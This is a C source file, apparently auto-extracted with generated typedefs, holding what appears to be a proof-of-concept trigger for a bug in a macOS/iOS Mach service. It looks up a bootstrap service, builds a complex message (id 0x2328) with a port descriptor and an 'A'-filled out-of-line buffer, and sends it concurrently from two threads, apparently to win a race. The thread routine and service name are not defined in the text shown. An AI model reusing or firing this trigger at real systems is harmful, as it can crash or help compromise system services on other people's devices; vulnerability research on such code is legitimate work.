
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_8__ TYPE_4__ ;
typedef struct TYPE_7__ TYPE_3__ ;
typedef struct TYPE_6__ TYPE_2__ ;
typedef struct TYPE_5__ TYPE_1__ ;


struct TYPE_8__ {int size; int type; int copy; scalar_t__ deallocate; void* address; } ;
struct TYPE_7__ {int disposition; int type; scalar_t__ name; } ;
struct TYPE_6__ {int msgh_descriptor_count; } ;
struct TYPE_5__ {int msgh_bits; int msgh_id; scalar_t__ msgh_local_port; scalar_t__ msgh_remote_port; } ;
struct dsmsg {int ool_size; TYPE_4__ ool_data; TYPE_3__ ool_port; TYPE_2__ body; TYPE_1__ hdr; int member_0; } ;
typedef int pthread_t ;
typedef int mach_port_t ;
typedef scalar_t__ kern_return_t ;


 scalar_t__ KERN_SUCCESS ;
 int MACH_MSGH_BITS (int ,int ) ;
 int MACH_MSGH_BITS_COMPLEX ;
 int MACH_MSG_OOL_DESCRIPTOR ;
 int MACH_MSG_PORT_DESCRIPTOR ;
 int MACH_MSG_TYPE_COPY_SEND ;
 int MACH_MSG_VIRTUAL_COPY ;
 scalar_t__ MACH_PORT_NULL ;
 scalar_t__ bootstrap_look_up (int ,char*,scalar_t__*) ;
 int do_thread ;
 int mach_task_self () ;
 void* malloc (int) ;
 int memset (void*,char,int) ;
 int printf (char*,...) ;
 int pthread_create (int *,int *,int ,void*) ;
 int pthread_join (int ,int *) ;
 char* service_name ;
 scalar_t__ service_port ;
 int task_get_bootstrap_port (int ,int *) ;

int main() {
  mach_port_t bs;
  task_get_bootstrap_port(mach_task_self(), &bs);

  kern_return_t err = bootstrap_look_up(bs, service_name, &service_port);
  if(err != KERN_SUCCESS){
    printf("unable to look up %s\n", service_name);
    return 1;
  }

  if (service_port == MACH_PORT_NULL) {
    printf("bad service port\n");
    return 1;
  }

  printf("got port\n");

  void* ool = malloc(0x100000);
  memset(ool, 'A', 0x1000);

  struct dsmsg msg = {0};

  msg.hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
  msg.hdr.msgh_remote_port = service_port;
  msg.hdr.msgh_local_port = MACH_PORT_NULL;
  msg.hdr.msgh_id = 0x2328;

  msg.body.msgh_descriptor_count = 2;

  msg.ool_port.name = MACH_PORT_NULL;
  msg.ool_port.disposition = 20;
  msg.ool_port.type = MACH_MSG_PORT_DESCRIPTOR;

  msg.ool_data.address = ool;
  msg.ool_data.size = 0x1000;
  msg.ool_data.deallocate = 0;
  msg.ool_data.copy = MACH_MSG_VIRTUAL_COPY;
  msg.ool_data.type = MACH_MSG_OOL_DESCRIPTOR;

  msg.ool_size = 0x1000;

  pthread_t threads[2] = {0};
  pthread_create(&threads[0], ((void*)0), do_thread, (void*)&msg);
  pthread_create(&threads[1], ((void*)0), do_thread, (void*)&msg);

  pthread_join(threads[0], ((void*)0));
  pthread_join(threads[1], ((void*)0));


  return 0;
}
